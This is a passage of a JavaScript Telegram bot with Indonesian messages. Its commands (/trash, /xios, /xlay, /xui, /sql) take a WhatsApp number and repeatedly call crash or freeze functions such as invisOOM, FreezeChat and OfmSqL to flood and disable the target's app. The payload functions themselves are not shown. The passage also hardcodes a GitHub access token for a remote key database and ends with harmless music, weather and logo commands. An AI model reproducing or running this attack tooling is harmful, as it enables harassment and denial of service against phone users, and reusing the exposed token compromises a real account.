     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
bot.command("trash", OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { 
    return ctx.reply(
      `❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 150; n++) {
        await invisOOM(target);
        await LocX(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/150`));
      }

      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
bot.command("xios", OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { 
    return ctx.reply(
      `❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 150; n++) {
        await await iozk(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/150`));
      }

      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
bot.command("xlay", AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { 
    return ctx.reply(
      `❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 50; n++) {
        await invisOOM(target);
        await annotationz(target);
        await OfmSqL(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/50`));
      }

      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
bot.command("xui", AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { 
    return ctx.reply(
      `❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 50; n++) {
        await ChatChat1(target);
        await ChatChat2(target);
        await xofm(target);
        await chatlock(target);
        await FreezeChat(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/50`));
      }

      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
bot.command("sql", AccessCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = ctx.message.text.split(" ")[0];
  const kkk = args[1];
  
  if (sessions.size === 0)
    return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
    
  if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`,
        parse_mode: "HTML"
      }
    );
  }

  const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { 
    return ctx.reply(
      `❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sent = await ctx.reply(`
<blockquote>
╔───「 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́ 」───⊱
│🚨 sᴛᴀᴛᴜs: Proses Sending 🚀
║⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
┃〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
┇🪐 sᴇssɪᴏɴ: ${sessions.size}
╚─────────────────⊱

🔮 Tunggu proses ini selesai baru lanjut bug
</blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    try {
      for (let n = 0; n < 90; n++) {
        await OfmSqL(target);
        await ofmEr(target);
        console.log(chalk.green(`send int to ${target} ${n + 1}/90`));
      }

      await ctx.telegram.editMessageMedia(
        ctx.chat.id,
        sent.message_id,
        null,
        {
          type: "photo",
          media: "https://files.catbox.moe/dcnz2q.jpg",
          caption: `
<blockquote>「 𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄Ｒ 」
🚨 sᴛᴀᴛᴜs ʙᴜɢ: Sukses Sending ✅
⚡ ︎ᴄᴏᴍᴍᴀɴᴅ: ${cmd} 
〽️ ᴛᴀʀɢᴇᴛ: ${rawTarget}
🪐 sᴇssɪᴏɴ: ${sessions.size}

🔮 ${target} sukses eksekusi target, sekarang lanjut bug lagi jika anda mau
</blockquote>`,
     parse_mode: "HTML"
    },
    {
     reply_markup: {
      inline_keyboard: [
       [{ text: "☏ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☏", url: `https://wa.me/${target.split("@")[0]}`, style: "success" }]
       ]
     }
   }
  );
 } catch (err) {
  console.log(chalk.red(`Error: ${err.message}`));
   await ctx.reply(`❌ Error: ${err.message}`);
  }
 })();
});
//#################$###############
const GITHUB_REPO = "Ryszox/ryszox";
const FILE_PATH = "tokenZasta.json";
const GITHUB_TOKEN = "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";
const GHData = `https://raw.githubusercontent.com/${GITHUB_REPO}/main/${FILE_PATH}`;

async function updateGithub(newData) {
  const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${FILE_PATH}`;

  const res = await axios.get(url, {
    headers: { Authorization: `token ${GITHUB_TOKEN}` }
  });
  const sha = res.data.sha;
  const content = Buffer.from(JSON.stringify(newData, null, 2)).toString("base64");

  await axios.put(url, {
    message: "Update db.json via bot",
    content,
    sha
  }, {
    headers: { Authorization: `token ${GITHUB_TOKEN}` }
  });
}
bot.command("adddb", OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const [token] = args;
  if (!token) return ctx.reply("❌ Format salah: /adddb <token>");

  const hash = crypto.createHash("sha256").update(token).digest("hex");

  const res = await axios.get(GHData);
  const db = res.data;

  db.tokens.push({ token, active: true, hash });

  await updateGithub(db);

  ctx.reply(`✔ Token ${token} berhasil ditambahkan ke DB`);
});
bot.command("deldb",  OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const [token] = args;
  if (!token) return ctx.reply("❌ Format salah: /deldb <token>");

  const res = await axios.get(GHData);
  const db = res.data;

  db.tokens = db.tokens.filter(t => t.token !== token);

  await updateGithub(db);

  ctx.reply(`🗑 Token ${token} berhasil dihapus dari DB`);
});
bot.command("listdb", OwnerCheck, async (ctx) => {
  const res = await axios.get(GHData);
  const db = res.data;

  const list = db.tokens.map(t => `🔑 ${t.token} | ${t.active ? "✅ aktif" : "❌ nonaktif"}`).join("\n");

  ctx.reply(`📂 List Token di DB:\n\n${list}`);
});
bot.command('addown', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`
<blockquote>🚨 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́
<b>Example:</b>
/addown [ Target UserID ]
</blockquote>
`, { parse_mode: "HTML" });
    }

    const userId = args[1];

    if (ownerUsers.includes(userId)) {
        return ctx.reply(
`
<blockquote>🚨 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́

🔮 Successful access add to owner list 
<b>🪙 UserID: ${userId}</b>
<b>⏰ Days: 1000 Days</b>

<code>©️ Xtrovie X Gen Bot</code>
</blockquote>
`, { parse_mode: "HTML" });
    }

    ownerUsers.push(userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(
`
<blockquote>🚨 ›› 𝐕͢𝐚͡𝐧͜𝐭𝐚͛𝐧̲𝐢𝐯 𝐙̤𝐚̂𝐬͢𝐭𝐚́

🔮 Successful access add to owner list 
<b>🪙 UserID: ${userId}</b>
<b>⏰ Days: 1000 Days</b>

<code>©️ Xtrovie X Gen Bot</code>
</blockquote>
`, { parse_mode: "HTML" });
});
bot.command('delown', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`\`\`\`
Send Id to remove Admin access
Example : /delown [ User Id ]
\`\`\``, { parse_mode: "MarkdownV2" });
    }

    const userId = args[1];

    if (!ownerUsers.includes(userId)) {
        return ctx.reply(
`
<blockquote>ユーザーがJSONファイルに存在しません</blockquote>

<b>Silahkan </b>
`, { parse_mode: "HTML" });
    }

    ownerUsers = ownerUsers.filter(id => id !== userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(
`
<b>Successfully deleted the user, bro.</b>

<b>UserID: ${userId}</b>

<pre>© 𝐙𝐚𝐬𝐭𝐚 𝐆𝐫𝐨𝐮𝐩 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command('addprem', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`
<pre>間違いです。IDを入力してください。</pre>

<b>Example:</b>
/addprem [ Target UserID ]

`, { parse_mode: "HTML" });
    }

    const userId = args[1];

    if (murbugUser.includes(userId)) {
        return ctx.reply(
`
<pre>アクセスを許可しました</pre>
<b>UserID: ${userId}</b>

<pre>© 𝐙𝐚𝐬𝐭𝐚 𝐆𝐫𝐨𝐮𝐩 𖤐</pre>
`, { parse_mode: "HTML" });
    }

    murbugUser.push(userId);
    saveJSON(BvGFile, murbugUser);

    return ctx.reply(
`
<pre>アクセスを許可しました</pre>
<b>UserID: ${userId}</b>

<pre>© 𝐙𝐚𝐬𝐭𝐚 𝐆𝐫𝐨𝐮𝐩 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command('delprem', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`\`\`\`
Send Id to remove Admin access
Example : /delprem [ User Id ]
\`\`\``, { parse_mode: "MarkdownV2" });
    }

    const userId = args[1];

    if (!murbugUser.includes(userId)) {
        return ctx.reply(
`
<blockquote>ユーザーがJSONファイルに存在しません</blockquote>

<b>Silahkan </b>
`, { parse_mode: "HTML" });
    }

    murbugUser = murbugUser.filter(id => id !== userId);
    saveJSON(BvGFile, murbugUser);

    return ctx.reply(
`
<b>Successfully deleted the user, bro.</b>

<b>UserID: ${userId}</b>

<pre>© 𝐙𝐚𝐬𝐭𝐚 𝐆𝐫𝐨𝐮𝐩 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command("addgb", OwnerCheck, (ctx) => {
  let groups = loadPremiumGroups();
  const chatId = Number(ctx.chat.id);

  if (!groups.includes(chatId)) {
    groups.push(chatId);
    savePremiumGroups(groups);
    return ctx.reply(
`
<blockquote>
Vantan!v Zasta

Message: Successfully Add this group to a premium group, now all members can use the available premium features 
</blockquote>
`, { parse_mode: "HTML" });
  } else {
    return ctx.reply(
`
<blockquote>
Vantan!v Zasta

Message: This group has become part of premium
</blockquote>
`, { parse_mode: "HTML" });
  }
});
bot.command("delgb", OwnerCheck, (ctx) => {
  let groups = loadPremiumGroups();
  const chatId = Number(ctx.chat.id);

  if (groups.includes(chatId)) {
    groups = groups.filter(id => id !== chatId);
    savePremiumGroups(groups);
    return ctx.reply(
`
<blockquote>
Vantan!v Zasta

Message: Group sukses di hapus dari daftar premium
</blockquote>
`, { parse_mode: "HTML" });
  } else {
    ctx.reply("ℹ️ Grup ini tidak ada di daftar Premium.");
  }
});

bot.command("addbug", OwnerCheck, (ctx) => {
  let targetId;
  if (ctx.message.reply_to_message) {
    targetId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetId = args[1];
  }

  if (!targetId) return ctx.reply("❌ Format Salah\nExample: /addbug <idUser>\nContoh: /addbug 123456789 atau reply pesan user");

  let users = loadPremiumUsers();
  if (!users.includes(targetId)) {
    users.push(targetId);
    savePremiumUsers(users);
    return ctx.reply(
`\`\`\`js
🎉 Sukses memberi akses kepada user tersebut

🕷 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐔𝐬𝐞𝐫
🕸 ᴜsᴇʀɪᴅ: ${targetId}
🦇 sᴛᴀᴛᴜs: ${murbugUser ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦" : "𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬"}

🚨 Message: Sukses menambahkan user tersebut ke dalam anggota premium, kini user tersebut bisa memakai fitur premium
\`\`\``, { parse_mode: "Markdown" });
  } else {
    ctx.reply("ℹ️ User ini sudah ada di daftar Premium.");
  }
});
bot.command("delbug", OwnerCheck, (ctx) => {
  let targetId;
  if (ctx.message.reply_to_message) {
    targetId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetId = args[1];
  }

  if (!targetId) return ctx.reply("❌ Format Salah\nExample: /delbut <idUser>\nContoh: /delbug 123456789 atau reply pesan user");

  let users = loadPremiumUsers();
  if (users.includes(targetId)) {
    users = users.filter(id => id !== targetId);
    savePremiumUsers(users);
    ctx.reply(`❌ User ${targetId} sudah dihapus dari Premium.`);
  } else {
    ctx.reply("ℹ️ User ini tidak ada di daftar Premium.");
  }
});
bot.command("cekakses", async (ctx) => {
  const groups = loadPremiumGroups();
  const users = loadPremiumUsers();

  const chatId = Number(ctx.chat.id);
  const userId = ctx.from.id.toString();

  if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
    if (groups.includes(chatId)) {
      return ctx.reply("✅ Grup ini terdaftar sebagai Premium.");
    } else {
      return ctx.reply("❌ Grup ini belum terdaftar sebagai Premium.");
    }
  }

  const args = ctx.message.text.split(" ");
  let targetId;

  if (ctx.message.reply_to_message) {
    targetId = ctx.message.reply_to_message.from.id.toString();
  } else if (args[1]) {
    targetId = args[1];
  } else {
    targetId = userId;
  }

  if (users.includes(targetId)) {
    return ctx.reply(`✅ User ${targetId} terdaftar sebagai Premium.`);
  } else {
    return ctx.reply(`❌ User ${targetId} belum terdaftar sebagai Premium.`);
  }
});
//##############################
bot.command('cuaca', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length === 0) return ctx.reply('❌🚧 Format: /cuaca <nama_kota>\nContoh: /cuaca Medan');

  const city = args.join(' ');
  try {
    const res = await axios.get(`https://api.siputzx.my.id/api/info/cuaca?q=${city}`);
    const root = res.data.data;

    if (!root || !root.weather || root.weather.length === 0) {
      return ctx.reply('❌ Data cuaca tidak ditemukan.');
    }

    const firstEntry = root.weather[0].cuaca[0][0];
    const kondisi = firstEntry.weather_desc;
    const suhu = `${firstEntry.t}°C`;
    const kelembaban = `${firstEntry.hu}%`;
    const angin = `${firstEntry.ws} m/s ${firstEntry.wd}`;
    const waktu = firstEntry.local_datetime;

    const emoji = weatherEmoji(kondisi);

    ctx.reply(`\`\`\`js
${emoji} Cuaca di *${city}* (${waktu}):
 • Kondisi: ${kondisi}
 • Suhu: ${suhu}
 • Kelembaban: ${kelembaban}
 • Angin: ${angin}

Sumber: BMKG
\`\`\``, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error(err);
    ctx.reply('⚠️ Gagal mengambil data cuaca, kemungkinan besar fitur lagi dalam perbaikan.');
  }
});
bot.command("play", async (ctx) => {
  try {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) return ctx.reply("Masukkan judul/url setelah /play");

    const { data } = await axios.get(`https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`);
    if (!data.status) return ctx.reply("Lagu tidak ditemukan");

    const res = data.result;
    await ctx.replyWithPhoto(res.thumbnail, {
      caption: `🎵 ${res.title}\n⏱️ ${Math.floor(res.duration/60)}:${(res.duration%60).toString().padStart(2, "0")}\n🔗 ${res.source}`
    });
    await ctx.replyWithAudio(res.audio.url, { title: res.title, duration: res.duration });

  } catch { ctx.reply("Gagal memproses, coba lagi nanti") }
})
bot.command(["ytshorts", "shorts"], async (ctx) => {
  try {
    const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!url) {
      return ctx.reply(
        "Contoh:\n/ytshorts https://youtube.com/shorts/xxxx"
      );
    }

    const msg = await ctx.reply("⏳ Sedang mengambil data...");
    const { data } = await axios.get(
      `https://api.ikyyxd.my.id/download/yt-shorts?url=${encodeURIComponent(url)}`
    );

    if (!data.status) {
      await ctx.deleteMessage(msg.message_id).catch(() => {});
      return ctx.reply("❌ Gagal mengambil video");
    }

    const result = data.result;

    await ctx.replyWithVideo(
      result.DownloadUrl.url,
      {
        caption:
`🎬 YouTube Shorts

📌 Title: ${result.title}
🆔 ID: ${result.id}`
      }
    );

    await ctx.deleteMessage(msg.message_id).catch(() => {});

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error saat mengirim video");
  }
});
bot.command("clogo", async (ctx) => {
  try {
    const prompt = ctx.message.text
      .split(" ")
      .slice(1)
      .join(" ")
      .trim();

    if (!prompt) {
      return ctx.reply(
`❌ Masukkan prompt logo

Contoh:
/createlogo logo coding dengan nama IkyyXD`,
        {
          reply_to_message_id:
            ctx.message.message_id
        }
      );
    }

    if (!global.logoSessions) {
      global.logoSessions = new Map();
    }

    global.logoSessions.set(
      ctx.from.id,
      prompt
    );

    return ctx.reply(

`🎨 Pilih model logo:

📝 Prompt:
${prompt}`,

      {
        reply_to_message_id:
          ctx.message.message_id,

        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "🎨 Sora AI",
                callback_data:
                  `logo_sora_${ctx.from.id}`
              },
              {
                text: "🖼️ Photiu AI",
                callback_data:
                  `logo_photiu_${ctx.from.id}`
              }
            ]
          ]
        }
      }
    );
  } catch (e) {
    console.log("CREATELOGO ERROR:", e);

    return ctx.reply(
      "❌ Terjadi kesalahan.",
      {
        reply_to_message_id:
          ctx.message.message_id
      }
    );
  }
});

bot.action(/logo_(sora|photiu)_(\d+)/, async (ctx) => {

    try {
      const userId =
        Number(ctx.match[2]);
      if (
        ctx.from.id !== userId
      ) {
        return ctx.answerCbQuery(
          "❌ Ini bukan tombol kamu",
          {
            show_alert: true
          }
        );
      }

      const prompt =
        global.logoSessions?.get(
          userId
        );

      if (!prompt) {
        return ctx.answerCbQuery(
          "❌ Session expired",
          {
            show_alert: true
          }
        );
      }

      const model =
        ctx.match[1];

      await ctx.answerCbQuery();
      await ctx.editMessageText(
`⏳ Membuat logo menggunakan ${
  model === "sora"
    ? "Sora AI"
    : "Photiu AI"
}...`
);

      let imageUrl;

      if (
        model === "sora"
      ) {
        const api =
`https://api.ikyyxd.my.id/ai/text2img?apikey=kyzz&text=${encodeURIComponent(prompt)}`;
        const {
          data
        } = await axios.get(api, {
          timeout: 0
        });

        imageUrl =
          data?.result?.url;

      } else {
        const api =
`https://api.ikyyxd.my.id/ai/photiu?prompt=${encodeURIComponent(prompt)}`;

        const {
          data
        } = await axios.get(api, {
          timeout: 0
        });

        imageUrl =
          data?.result?.image;
      }
      if (!imageUrl) {
        throw new Error("Image tidak ditemukan"
        );
      }

      global.logoSessions.delete(userId);

      return ctx.replyWithPhoto(
        imageUrl,
        {
          caption:
`✅ Logo berhasil dibuat

🎨 Model:
${
  model === "sora"
    ? "Sora AI"
    : "Photiu AI"
}

📝 Prompt:
${prompt}`,

          reply_to_message_id:
            ctx.callbackQuery.message.message_id
        }
      );

    } catch (e) {
      console.log("CALLBACK ERROR:", e);
      return ctx.reply(
        "❌ Gagal membuat logo."
      );
    }
  }
);
bot.command(["spotify", "spotifyplay", "Spotifydl", "Spotify", "spotifydl"], async (ctx) => {
  try {
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim()

    if (!input) {
      return ctx.reply(
        "Contoh:\n/spotify kelingan mantan\natau\n/spotify https://open.spotify.com/track/xxxx"
      )
    }

    const msg = await ctx.reply("🔍 Mencari lagu...")

    let spotifyUrl = input

    if (!input.includes("open.spotify.com")) {
      const search = await axios.get(
        `https://riimusic.my.id/api/spotify/search?apikey=riicode&query=${encodeURIComponent(input)}`
      )

      const track = search.data?.result?.songs?.[0]

      if (!track) {
        await ctx.deleteMessage(msg.message_id).catch(() => {})
        return ctx.reply("❌ Lagu tidak ditemukan")
      }

      spotifyUrl = track.url

      await ctx.editMessageText(
`🎵 Ditemukan

📌 ${track.title}
👤 ${track.artist}

⬇️ Mengambil metadata...`
      ).catch(() => {})
    }

    const { data } = await axios.get(
      `https://api.ikyyxd.my.id/download/spotifydl?url=${encodeURIComponent(spotifyUrl)}`
    )

    if (!data.status) {
      await ctx.deleteMessage(msg.message_id).catch(() => {})
      return ctx.reply("❌ Gagal mengambil lagu")
    }

    const song = data.result

    await ctx.replyWithPhoto(song.thumbnail, {
      caption:
`🎵 ${song.title}

👤 Artist : ${song.artist}
💿 Album : ${song.album || "-"}
⏱️ Duration : ${song.duration}

⬇️ Sedang mengunduh audio...`
    })

    await ctx.editMessageText("⬇️ Mengunduh audio...").catch(() => null)

    const audio = await axios.get(song.download, {
      responseType: "arraybuffer",
      headers: {
        "User-Agent": "Mozilla/5.0"
      }
    })

    await ctx.replyWithAudio(
      {
        source: Buffer.from(audio.data),
        filename: `${song.title}.mp3`
      },
